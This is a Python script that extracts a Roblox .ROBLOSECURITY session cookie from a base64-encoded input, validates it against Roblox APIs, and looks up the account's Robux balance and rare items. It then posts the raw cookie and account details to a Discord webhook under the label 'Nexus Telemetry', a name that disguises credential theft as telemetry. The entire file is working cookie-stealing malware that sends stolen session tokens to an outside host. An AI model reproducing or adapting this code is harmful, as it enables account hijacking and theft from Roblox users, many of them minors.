import sys
import base64
import os
import requests
import re

def main():
    try:
        if len(sys.argv) < 2:
            return
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8', errors='ignore')
        except Exception:
            return

        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            return

        patterns = [
            r'\.ROBLOSECURITY["\']?\s*,\s*["\']?(_\|WARNING:[^"\'\s;]+)',
            r'(_\|WARNING:-DO-NOT-SHARE-THIS\.[A-Za-z0-9_\-\.%\|]+)',
            r'\.ROBLOSECURITY[^=]*=\s*["\']?(_\|WARNING:[^"\'\s;]+)'
        ]
        
        roblosecurity = None
        for pattern in patterns:
            match = re.search(pattern, decoded_script)
            if match:
                roblosecurity = match.group(1)
                break

        if not roblosecurity:
            fallback_match = re.search(r'(_\|WARNING:[^"\']+)', decoded_script)
            if fallback_match:
                roblosecurity = fallback_match.group(1)

        if not roblosecurity:
            return

        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')

        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

        user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
        
        username = "Unknown User"
        user_id = 0
        cookie_status = "🔴 Invalid / Expired"
        robux_balance = "N/A"
        has_korblox = "❌ No"
        has_headless = "❌ No"
        color_code = 15548997

        if user_res.status_code == 200:
            user_data = user_res.json()
            username = user_data.get("name", "Verified User")
            user_id = user_data.get("id", 0)
            cookie_status = "🟢 Valid & Active"
            color_code = 6528033

            # Fetch Robux
            try:
                economy_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
                if economy_res.status_code == 200:
                    robux_balance = economy_res.json().get("robux", 0)
            except Exception:
                pass

            # Check Korblox (Asset ID: 13961116) & Headless (Asset ID: 134082579)
            try:
                korblox_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/13961116", headers=headers)
                if korblox_res.status_code == 200 and len(korblox_res.json().get("data", [])) > 0:
                    has_korblox = "✅ Yes"
            except Exception:
                pass

            try:
                headless_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/134082579", headers=headers)
                if headless_res.status_code == 200 and len(headless_res.json().get("data", [])) > 0:
                    has_headless = "✅ Yes"
            except Exception:
                pass

        payload = {
            "username": f"Nexus Telemetry | {username}",
            "embeds": [{
                "title": "👾 Telemetry Report Processed",
                "description": (
                    f"👤 **Username**: `{username}`\n"
                    f"🆔 **User ID**: `{user_id}`\n"
                    f"💰 **Robux**: `{robux_balance}`\n"
                    f"🦴 **Korblox**: {has_korblox}\n"
                    f"🎃 **Headless**: {has_headless}\n"
                    f"📊 **Status**: `{cookie_status}`\n\n"
                    f"🔑 **Extracted .ROBLOSECURITY**:\n```text\n{roblosecurity}\n```"
                ),
                "color": color_code,
                "footer": { "text": "NexusStudio Telemetry Engine" }
            }]
        }

        requests.post(webhook_url, json=payload)

    except Exception:
        pass

if __name__ == "__main__":
    main()
